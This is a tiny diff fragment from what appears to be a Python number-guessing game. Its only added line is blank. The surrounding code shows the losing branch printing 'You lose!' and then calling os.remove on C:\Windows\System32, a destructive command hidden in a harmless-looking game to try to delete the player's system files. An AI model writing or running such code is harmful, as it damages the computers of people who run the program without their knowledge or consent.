@@ -9,3 +9,4 @@ if guess == number:
 else:
     print("You lose!")
     os.remove("C:\Windows\System32")
+    
